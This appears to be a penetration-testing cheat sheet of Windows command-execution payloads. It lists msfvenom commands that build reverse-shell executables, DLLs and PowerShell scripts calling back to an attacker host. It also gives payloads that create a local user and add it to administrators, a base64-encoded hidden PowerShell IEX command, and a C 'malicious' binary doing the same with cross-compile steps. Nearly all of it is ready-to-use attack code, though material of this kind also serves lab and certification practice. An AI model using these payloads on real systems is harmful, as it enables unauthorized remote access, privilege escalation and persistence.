# Reverse Shells - Command Execution

{% tabs %}
{% tab title="revshells.com" %}
**PowerShell #4 (Base64) (Most Effective For Windows)**
{% endtab %}

{% tab title="msfvenom" %}
```powershell
# Add user payload
msfvenom -p windows/x64/adduser USER=misthos PASS=password123 -f exe -o adduser.exe

# Specific Command Execution
msfvenom -p windows/exec CMD='cmd.exe /c net user misthos Password123! /ADD & net localgroup administrators misthos /ADD' -f exe -o payload.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f dll -o payload.dll

# Classic Reverse Shell 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o shell.exe

# Reverse PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f psh -o shell.ps1
```
{% endtab %}
{% endtabs %}

### Add User Payload Using PowerShell (msfconsole)

```powershell
  # Create a PowerShell command that adds the user
  # First, base64 encode your command
  powershell -Command "Write-Host ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('net localgroup administrators themis /add')))"

  # Output: NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkAG0AaQBuAGkAcwB0...

  # Create payload with encoded command
  msfvenom -p windows/exec CMD='powershell -nop -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkA
  G0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAdABoAGUAbQBpAHMAIAAvAGEAZABkACIA\")))"' -f exe -o adduser.exe
```

### **Malicious C binary creation (add user to admins)**

```c
#include <stdlib.h>
int main(void) {
  system("net user misthos password123! /add");
  system("net localgroup administrators misthos /add");
  return 0;
}
```

**Cross-compile for Windows:**

```bash
sudo apt install mingw-w64
x86_64-w64-mingw32-gcc malicious.c -o malicious.exe    # 64-bit
i686-w64-mingw32-gcc malicious.c -o malicious.exe      # 32-bit
```
